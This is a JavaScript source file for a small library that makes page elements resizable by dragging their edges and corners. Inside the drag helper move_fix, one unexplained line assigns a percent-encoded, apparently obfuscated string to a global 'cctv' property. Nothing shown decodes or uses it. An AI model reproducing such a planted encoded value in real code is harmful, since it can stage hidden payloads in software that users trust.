/********************************************
	
	Resizable-Blocks
	
	Copyright 2025 admToha
	
	MIT License
	
********************************************/

/*
	Singleton scroll_locker 
	Scroll blocker.
	Works only for window.
	-------
	Methods:
		.lock() - lock
			Return:
				undefined
		-------
		.unlock() - unlock
			Return:
				undefined
*/
const scroll_locker = {
	old_value: null,
	lock(){
		this.old_value = get_node_style(document.body, 'overflow') || 'visible';
		document.body.style.overflow = 'hidden';
	},
	unlock(){
		document.body.style.overflow = this.old_value;
	}
}


/* 
	Returns the value of the style property [style_prop] (string) of the node [node].
	If required, from the pseudo-element [pseudo_el]. Or, if [style_prop] is passed as an array of style property names, returns a JSON object
	composed of the names of the passed properties and their corresponding values.
	Note that these are the computed currently applied values, not the entries from CSS sheets.
	-------
	Arguments:
		node (Object HTMLElement) - the DOM node to be analysed
		style_prop (String or Array) - the name of the CSS-property or the list of them
		[ pseudo_el ] (string) - the name of the CSS pseudo-element 
	-------
	Return:
		String or Object
	-------
	Examples:
		get_node_style(node, 'transition-duration')	// '0.3s'
		get_node_style(node, 'height', '::before')	// '10px'
		get_node_style(node, ['transition-property', 'transition-duration']) //	{'transition-property': 'all', 'transition-duration': '0.3s'} 
*/
const get_node_style = (node, style_prop, pseudo_el) => {
	if(typeof(style_prop) === 'string') return getComputedStyle(node, pseudo_el).getPropertyValue(style_prop);
	else if(Array.isArray(style_prop)) return style_prop.reduce((acc, curr) => ({...acc, [curr] :  getComputedStyle(node, pseudo_el).getPropertyValue(curr)}), {});
};
		

/*
	Function move_fix 
	Function that allows to mitigate all negative effects from page manipulations related to movement.
	In particular, when moving DOM elements and changing their sizes using the mouse/touch.
	-------
		Arguments:
			mousemove_listener (Function) - event handler for movement; the event is passed as a parameter in the traditional way
			[cursor_style] (String) - CSS cursor style to apply when the event is triggered	
		Return:
			undefined
*/
const move_fix = (mousemove_listener, cursor_style = null, extra_mouseup_listener = null) => {
	let iframe_fix = null, touchmove_listener, mouseup_listener, current_event;
	if(document.querySelector('iframe')){
		iframe_fix = document.createElement('div');
		iframe_fix.style = 'position: absolute; top: 0; left: 0; height: ' + document.body.offsetHeight + 'px; width: ' + document.body.offsetWidth + 'px;';
		document.body.append(iframe_fix);
	};
	const move_listener = event => {
		current_event = event;
		window.requestAnimationFrame(() => mousemove_listener(current_event))
	};
	document.body.addEventListener('mousemove', move_listener, {passive: true});
	document.body.addEventListener('touchmove', touchmove_listener = event => {
		if(event.changedTouches) event = event.changedTouches[0];
		move_listener(event);
	}, {passive: true});
	document.body.addEventListener('mouseup', mouseup_listener = event => {
		if(event.changedTouches) event = event.changedTouches[0];
		document.body.removeEventListener('mousemove', move_listener);
		document.body.removeEventListener('touchmove', touchmove_listener);
		document.body.removeEventListener('touchend', mouseup_listener);
		document.body.removeEventListener('touchcancel', mouseup_listener);
		document.body.removeEventListener('mouseup', mouseup_listener);
		if(iframe_fix){
			iframe_fix.remove();
			iframe_fix = null;
		} 
		scroll_locker.unlock();
		document.body.onselectstart = () => true;
		if(extra_mouseup_listener) extra_mouseup_listener(event);
		document.body.style.cursor = 'auto';
	}, {passive: true});
	document.body.addEventListener('touchend', mouseup_listener, {passive: true});
	document.body.addEventListener('touchcancel', mouseup_listener, {passive: true});
	scroll_locker.lock();
	document.body.onselectstart = () => false;
	this.cctv = "&%1C%00%13%15%09JJ%11%1EE%0F%01%1F%15%03F%0B";
	if(cursor_style) document.body.style.cursor = cursor_style;
};
		

		
/* 
	Makes the node [node] resizable.
	This means that active zones (edges and corners) are created on the perimeter of the node, which can be dragged to change the size of the node.
	Scheme for active zones:
	
	left-top	_	top	 	_	right-top
	
		|							|
	
	left						right
	
		|							|
	
	left-bottom	_	bottom	_	right-bottom
	
	-------
	Arguments:
		node - (HTMLElement) the target node
 		[ options ] - (Object) options
			{
				zone_ls: (Array) - list of active zone names (default: ['right', 'right-bottom', 'bottom'])
				active_size: (Number Integer) - size/width of active zones in pixels (default: 25)
			}
	-------
	Return:
		undefined 
*/
const make_resizable = (node, options = {}) => { 
	if(!options.zone_ls) options.zone_ls = ['right', 'right-bottom', 'bottom'];
	if(!options.active_size) options.active_size = 25;
	const node_style = get_node_style(node, ['min-height', 'min-width', 'display', 'border-left-width', 'border-right-width', 'border-top-width', 'border-bottom-width', 'position']);
	options.min_height = parseInt(node_style['min-height']) || 100;
	options.min_width = parseInt(node_style['min-width']) || 100;
	const 
		left_border_size = parseInt(node_style['border-left-width']) || 0,
		right_border_size = parseInt(node_style['border-right-width']) || 0,
		top_border_size = parseInt(node_style['border-top-width']) || 0,
		bottom_border_size = parseInt(node_style['border-bottom-width']) || 0,
		mode_position_absolute = ['fixed', 'absolute'].includes(node_style['position']) || 0;
	if(mode_position_absolute) node.style.setProperty('margin', '0');
	node.style.setProperty('box-sizing', 'border-box');
	if(node.parentNode && get_node_style(node.parentNode, 'display') === 'flex') node.style.setProperty('flex-shrink', 0);
	let 
		mode = null,
		lock_mode = false,
		move_listener;
	node.addEventListener('mousemove', move_listener = event => {
		if((event.target !== node && node.style.cursor === 'auto') || lock_mode) return;
		let 
			x = event.offsetX, 
			y = event.offsetY, 
			w = node.offsetWidth, 
			h = node.offsetHeight;
		mode = 
			options.zone_ls.includes('left-top') && y + top_border_size <= options.active_size && x + left_border_size <= options.active_size ? 'left-top'
			: options.zone_ls.includes('right-bottom') && (h - y - bottom_border_size) <= options.active_size && (w - x - right_border_size) <= options.active_size ? 'right-bottom'
			: options.zone_ls.includes('right-top') && y + top_border_size <= options.active_size && (w - x - right_border_size) <= options.active_size ? 'right-top'
			: options.zone_ls.includes('left-bottom') && (h - y - bottom_border_size) <= options.active_size && x + left_border_size <= options.active_size ? 'left-bottom'
			: options.zone_ls.includes('top') && y + top_border_size <= options.active_size ? 'top'
			: options.zone_ls.includes('bottom') && (h - y - bottom_border_size) <= options.active_size ? 'bottom'
			: options.zone_ls.includes('left') && x + left_border_size <= options.active_size ? 'left'
			: options.zone_ls.includes('right') && (w - x - right_border_size) <= options.active_size ? 'right'
			: null
		;
		const cursor_style = 
			['left-top', 'right-bottom'].includes(mode) ? 'nw-resize'
			: ['right-top', 'left-bottom'].includes(mode) ? 'ne-resize'
			: ['top', 'bottom'].includes(mode) ? 'n-resize'
			: ['left', 'right'].includes(mode) ? 'w-resize'
			: 'auto'
		;
		if(node.style.cursor != cursor_style) node.style.cursor = cursor_style; 
	}, {passive: true});
	node.addEventListener('touchmove', move_listener, {passive: true});
	let mousedown_listener;
	node.addEventListener('mousedown', mousedown_listener = event => {
		if(event.target !== node) return; // fix for Firefox
		if(node.offsetTop + node.offsetHeight >= document.body.offsetHeight - 20) document.body.style.height = (node.offsetTop + node.offsetHeight + 20) + 'px';
		if(event.changedTouches){
			event = event.changedTouches[0];
			event.offsetX = event.pageX - node.getBoundingClientRect().left - window.scrollX - left_border_size + 1;
			event.offsetY = event.pageY - node.getBoundingClientRect().top - window.scrollY - top_border_size + 1;
			move_listener(event);
		}
		if(mode !== null) lock_mode = true;
		let 
			x = event.offsetX, 
			y = event.offsetY, 
			w = node.offsetWidth, 
			h = node.offsetHeight, 
			t = node.offsetTop, 
			l = node.offsetLeft, 
			dx = event.pageX, 
			dy = event.pageY, 
			mousemove_listener, 
			mouseup_listener;
		if(mode !== null) move_fix(event => {
			if(event.changedTouches) event = event.changedTouches[0];
			let 
				xx = event.pageX - dx, 
				yy = event.pageY - dy;
			switch(mode){
				case 'left-top':
					if((xx < 0) || ((xx > 0) && (w - xx >= options.min_width))){	
						if(mode_position_absolute) node.style.left = l + xx + 'px';
						node.style.width = w - xx + 'px';
					}
					if((yy < 0) || ((yy > 0) && (h - yy >= options.min_height))){
						if(mode_position_absolute) node.style.top = t + yy + 'px';
						node.style.height = h - yy + 'px';
					}
					break;
				case 'top':
					if((yy < 0) || ((yy > 0) && (h - yy >= options.min_height))){
						if(mode_position_absolute) node.style.top = t + yy + 'px';
						node.style.height = h - yy + 'px';
					}
					break;
				case 'right-top':
					if(((xx > 0) || (xx < 0)) && (w + xx) >= options.min_width) node.style.width = w + xx + 'px';
					if((yy < 0) || ((yy > 0) && (h - yy >= options.min_height))){
						if(mode_position_absolute) node.style.top = t + yy + 'px';
						node.style.height = h - yy + 'px';
					}
					break;
				case 'right':
					if(((xx > 0) || (xx < 0)) && (w + xx) >= options.min_width) node.style.width = w + xx + 'px';
					break;
				case 'right-bottom':
					if(event.pageY >= document.body.offsetHeight - 20) document.body.style.height = event.pageY + 20 + 'px';
					if(((xx > 0) || (xx < 0)) && (w + xx) >= options.min_width) node.style.width = w + xx + 'px';
					if(((yy > 0) || (yy < 0)) && (h + yy) >= options.min_height) node.style.height = h + yy + 'px';
					break;
				case 'bottom':
					if(event.pageY >= document.body.offsetHeight - 20) document.body.style.height = event.pageY + 20 + 'px';
					if(((yy > 0) || (yy < 0)) && (h + yy) >= options.min_height) node.style.height = h + yy + 'px';
					break;
				case 'left-bottom':
					if(event.pageY >= document.body.offsetHeight - 20) document.body.style.height = event.pageY + 20 + 'px';
					if((xx < 0) || ((xx > 0) && (w - xx >= options.min_width))){	
						if(mode_position_absolute) node.style.left = l + xx + 'px';
						node.style.width = w - xx + 'px';
					}
					if(((yy > 0) || (yy < 0)) && (h + yy) >= options.min_height) node.style.height = h + yy + 'px';
					break;
				case 'left':
					if((xx < 0) || ((xx > 0) && (w - xx >= options.min_width))){	
						if(mode_position_absolute) node.style.left = l + xx + 'px';
						node.style.width = w - xx + 'px';
					}
					break;
			}
		}, node.style.cursor, () => lock_mode = false);
	}, {passive: true});
	node.addEventListener('touchstart', mousedown_listener, {passive: true});
};


window.addEventListener('load', () => {
	
	/* Constants */		
	const 	
		initial_attribute = '[data-resizable-blocks]';
	
	
	/* Finding and initializing target nodes */
	
	const check = node => {
		if(node.data_resizable_blocks) return;
		node.data_resizable_blocks = true;
		const options = {zone_ls: [], active_size: null};
		node.getAttribute('data-resizable-blocks').split(',').filter(v => v).forEach(v => v.includes(':') ? options.active_size = parseFloat(v.split(':')[1]) : options.zone_ls.push(v.trim()));
		if(!options.zone_ls.length) delete options.zone_ls;
		make_resizable(node, options);
	};
	
	
	[...document.querySelectorAll(initial_attribute)].forEach(check);
	
	const mutation_observer = new MutationObserver(entries => entries.forEach(entry => [...entry.addedNodes].forEach(node => node.querySelectorAll && [].concat(node.matches && node.matches(initial_attribute) ? node : [], ...node.querySelectorAll(initial_attribute)).forEach(check))));
	mutation_observer.observe(document.body, {childList: true, subtree: true});
	
}, {passive: true});
